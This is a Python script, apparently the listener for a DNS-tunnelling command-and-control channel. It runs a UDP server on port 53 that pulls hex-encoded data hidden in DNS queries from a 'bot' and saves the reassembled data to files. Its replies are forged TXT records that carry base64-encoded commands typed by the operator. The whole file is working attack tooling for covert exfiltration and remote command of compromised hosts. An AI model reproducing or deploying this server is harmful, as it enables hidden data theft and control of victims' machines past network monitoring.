import socketserver
import os
import random
import string
from base64 import *
import threading
import time
from binascii import *
from Crypto.Util.number import *



def handle(self):
	global target
	global count
	data = self.request[0].strip()
	bot = self.request[1]
	current_thread = threading.current_thread()

	try:
		trans_id = data[:2]
		lenght = data[14]
		data = data.split(b'\x04')[0][13:].decode()
		mark = data[:3]
		data = data[4:]
		data = unhexlify(data)
		target += data.decode('utf-8','ignore')
		if (mark == 'end'):
			print("[+] ALL DATA RECEIVED:  ")
			print("--------------------------------------")
			print("--------------------------------------")
			print(target)
			print("--------------------------------------")
			print("--------------------------------------")
			f = open('file{}'.format(str(count)), 'w+')
			f.write(target)
			f.close()
			count += 1

	except:
		pass
	print("{}: client: {}, data: {}".format(current_thread.name, self.client_address, data))
	cmd = self.build_res(data, trans_id, lenght)
	bot.sendto(cmd, self.client_address)
		


class ThreadUDPrequestHandler(socketserver.BaseRequestHandler):

	handle = handle

	def build_res(self,data, trans_id, lenght):
		trans_id = trans_id
		flag = b'\x85\x80'
		q_count = b'\x00\x01'
		a_count = b'\x00\x01'
		au_count = b'\x00\x00'
		ad_count = b'\x00\x00'
		lenght = bytes([lenght])
		try:
			domain = data.encode()
		except:
			domain = data
		cmd = self.build_cmd()
		ty = b'\x00\x10'
		clas = b'\x00\x01'
		res = trans_id + flag + q_count + a_count + au_count + ad_count + lenght + domain + ty + clas + cmd
		return res
	
	def build_cmd(self):
		cmd = input().encode()
		answer = b'\xc0\x0c\x00\x10\x00\x01\x00\x03\xf4\x80'
		len_data = (len(b64encode(cmd)) + 1).to_bytes(2, byteorder='big')
		len_txt = long_to_bytes(len(b64encode(cmd)))
		answer += len_data + len_txt + b64encode(cmd)
		return answer


class ThreadedUDPServer(socketserver.ThreadingMixIn, socketserver.UDPServer):
	allow_reuse_address = True
	pass


if __name__ == '__main__':
	host, port = '10.0.0.19', 53
	target = ''
	count = 0
	server = ThreadedUDPServer((host,port), ThreadUDPrequestHandler)
	server_thread = threading.Thread(target = server.serve_forever)
	server_thread.deamon = True

	try:
		server_thread.start()
		print('[+] Listening on port 53')
		while True:
			time.sleep(100)
	except(KeyboardInterrupt, SystemExit):
		server.shutdown()
		server.server_close()
		exit()

	



